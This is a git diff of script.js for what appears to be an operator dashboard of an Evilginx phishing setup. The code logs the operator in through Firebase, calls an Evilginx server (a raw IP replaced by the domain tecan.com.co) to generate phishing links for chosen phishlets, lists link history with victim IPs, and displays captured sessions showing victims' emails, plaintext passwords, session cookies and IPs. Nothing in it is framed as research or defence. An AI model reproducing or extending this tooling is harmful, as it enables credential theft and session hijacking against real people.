@@ -1,9 +1,9 @@
 console.log("✅ script.js loaded successfully");
 
-// Set your Evilginx server (update with your actual domain or public IP and port)
-const EVILGINX_SERVER = "http://3.149.242.245:5000";
+// Set Evilginx API server URL
+const EVILGINX_SERVER = "https://tecan.com.co";
 
-// Wait for Firebase to load before executing functions.
+// Wait for Firebase to load before executing functions
 document.addEventListener("DOMContentLoaded", function () {
   if (typeof firebase === "undefined") {
     console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
@@ -11,33 +11,29 @@ document.addEventListener("DOMContentLoaded", function () {
   }
   checkAuthStatus();
 
-  // Attach login event if not already attached
-  const loginBtn = document.getElementById("loginBtn");
-  if (loginBtn) {
-    loginBtn.addEventListener("click", login);
-  }
+  // Attach event listeners for login/logout if present
+  document.getElementById("loginBtn")?.addEventListener("click", login);
+  document.getElementById("logoutBtn")?.addEventListener("click", logout);
 });
 
-// Check Authentication Status and Redirect Accordingly.
+// Check authentication status
 function checkAuthStatus() {
   firebase.auth().onAuthStateChanged(function (user) {
     if (user) {
       console.log("✅ User logged in:", user.email);
-      // If on login page and user is already logged in, redirect to dashboard.
       if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
         window.location.href = "dashboard.html";
       }
     } else {
       console.log("❌ User not logged in.");
-      // If on a dashboard page and not logged in, redirect to login.
-      if (window.location.pathname.endsWith("dashboard.html") || window.location.pathname.endsWith("dashboard2.html")) {
+      if (window.location.pathname.includes("dashboard")) {
         window.location.href = "index.html";
       }
     }
   });
 }
 
-// Login Function.
+// Login function
 function login() {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
@@ -48,111 +44,141 @@ function login() {
   }
 
   firebase.auth().signInWithEmailAndPassword(email, password)
-    .then(function (userCredential) {
+    .then((userCredential) => {
       console.log("✅ Login successful:", userCredential.user.email);
       window.location.href = "dashboard.html";
     })
-    .catch(function (error) {
+    .catch((error) => {
       console.error("❌ Login failed:", error.message);
       document.getElementById("loginError").innerText = error.message;
     });
 }
 
-// Logout Function.
+// Logout function
 function logout() {
-  firebase.auth().signOut().then(function () {
-    console.log("✅ User logged out.");
-    window.location.href = "index.html";
-  }).catch(function (error) {
-    console.error("❌ Logout failed:", error.message);
-  });
-}
-
-// --------------------- Evilginx API Integration ---------------------
-
-// Generate a generic Evilginx phishing link.
-function generateLink() {
-  fetch(`${EVILGINX_SERVER}/generate_link`)
-    .then(function (response) { return response.json(); })
-    .then(function (data) {
-      if (data.link) {
-        console.log("✅ Link generated:", data.link);
-        alert("Phishing Link: " + data.link);
-      } else {
-        console.error("❌ Failed to generate link:", data);
-        alert("Failed to generate link.");
-      }
+  firebase.auth().signOut()
+    .then(() => {
+      console.log("✅ User logged out.");
+      window.location.href = "index.html";
     })
-    .catch(function (error) {
-      console.error("❌ Error generating link:", error);
-      alert("Error generating link. Check Evilginx server.");
+    .catch((error) => {
+      console.error("❌ Logout failed:", error.message);
     });
 }
 
-// Generate a phishing link for a specific phishlet (for Dashboard2).
+// Generate phishing link for a specific phishlet
 function generatePhishletLink(phishlet) {
-  const url = `${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`;
-  fetch(url)
-    .then(response => response.json())
+  console.log(`🔄 Generating link for phishlet: ${phishlet}`);
+  fetch(`${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`, {
+    method: "GET",
+    credentials: "include", // Allow cookies if needed
+    headers: {
+      "Content-Type": "application/json"
+    }
+  })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
+    })
     .then(data => {
       if (data.link) {
-        console.log("✅ Generated link for", phishlet, ":", data.link);
-        document.getElementById("phishletLink").innerHTML =
-          `Generated Link for ${phishlet}: <a href="${data.link}" target="_blank">${data.link}</a>`;
+        console.log(`✅ Generated link for ${phishlet}:`, data.link);
+        document.getElementById("phishletLink").innerHTML = `
+          Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
       } else {
-        console.error("❌ Failed to generate link for", phishlet, data);
-        alert("Failed to generate link for " + phishlet);
+        throw new Error("Failed to generate link.");
       }
     })
     .catch(error => {
-      console.error("❌ Error generating phishlet link:", error);
-      alert("Error generating phishlet link for " + phishlet);
+      console.error("❌ Error generating link:", error);
+      alert("Error generating link: " + error.message);
     });
 }
 
-// Fetch and display captured sessions from Evilginx.
-function viewCapturedSessions() {
-  fetch(`${EVILGINX_SERVER}/captured_sessions`)
-    .then(function (response) { return response.json(); })
-    .then(function (data) {
-      let tableBody = document.getElementById("capturedSessions");
-      tableBody.innerHTML = ""; // Clear previous data
-      data.forEach(function (session) {
-        let row = `<tr>
-                      <td>${session.email}</td>
-                      <td>${session.password}</td>
-                      <td>${session.cookies}</td>
-                      <td>${session.ip}</td>
-                   </tr>`;
-        tableBody.innerHTML += row;
-      });
-      console.log("✅ Captured sessions loaded successfully.");
-    })
-    .catch(function (error) {
-      console.error("❌ Error fetching captured sessions:", error);
-      alert("Error fetching captured sessions.");
-    });
-}
-
-// Fetch and display generated links history from Evilginx.
+// Fetch generated links history and update the table with id "generatedLinks"
 function viewGeneratedLinks() {
-  fetch(`${EVILGINX_SERVER}/generated_links`)
-    .then(function (response) { return response.json(); })
-    .then(function (data) {
-      let tableBody = document.getElementById("generatedLinks");
-      tableBody.innerHTML = ""; // Clear previous data
-      data.forEach(function (link) {
-        let row = `<tr>
-                      <td>${link.url}</td>
-                      <td>${link.clicked_location}</td>
-                      <td>${link.ip}</td>
-                   </tr>`;
-        tableBody.innerHTML += row;
-      });
-      console.log("✅ Generated links history loaded successfully.");
+  console.log("🔄 Fetching generated links history...");
+  fetch(`${EVILGINX_SERVER}/generated_links_history`, {
+    method: "GET",
+    headers: {
+      "Content-Type": "application/json"
+    }
+  })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
     })
-    .catch(function (error) {
+    .then(data => {
+      let tableBody = document.getElementById("generatedLinks");
+      if (!tableBody) {
+        console.error("Element with id 'generatedLinks' not found.");
+        return;
+      }
+      tableBody.innerHTML = "";
+      if (data.length === 0) {
+        tableBody.innerHTML = "<tr><td colspan='4'>No generated links found.</td></tr>";
+      } else {
+        data.forEach(record => {
+          tableBody.innerHTML += `<tr>
+                                    <td>${record.phishlet}</td>
+                                    <td>${record.link}</td>
+                                    <td>${record.timestamp}</td>
+                                    <td>${record.ip}</td>
+                                  </tr>`;
+        });
+      }
+      console.log("✅ Generated links updated successfully.");
+    })
+    .catch(error => {
       console.error("❌ Error fetching generated links:", error);
-      alert("Error fetching generated links history.");
+      alert("Failed to load generated links: " + error.message);
     });
 }
+
+// Fetch captured sessions and update the table with id "capturedSessions"
+function viewCapturedSessions() {
+  console.log("🔄 Fetching captured sessions...");
+  fetch(`${EVILGINX_SERVER}/captured_sessions`, {
+    method: "GET",
+    headers: {
+      "Content-Type": "application/json"
+    }
+  })
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(data => {
+      let tableBody = document.getElementById("capturedSessions");
+      if (!tableBody) {
+        console.error("Element with id 'capturedSessions' not found.");
+        return;
+      }
+      tableBody.innerHTML = "";
+      if (data.length === 0) {
+        tableBody.innerHTML = "<tr><td colspan='5'>No captured sessions found.</td></tr>";
+      } else {
+        data.forEach(session => {
+          tableBody.innerHTML += `<tr>
+                                    <td>${session.email}</td>
+                                    <td>${session.password}</td>
+                                    <td>${session.cookies}</td>
+                                    <td>${session.ip}</td>
+                                    <td>${session.timestamp}</td>
+                                  </tr>`;
+        });
+      }
+      console.log("✅ Captured sessions updated successfully.");
+    })
+    .catch(error => {
+      console.error("❌ Error fetching captured sessions:", error);
+      alert("Failed to load captured sessions: " + error.message);
+    });
+}
+
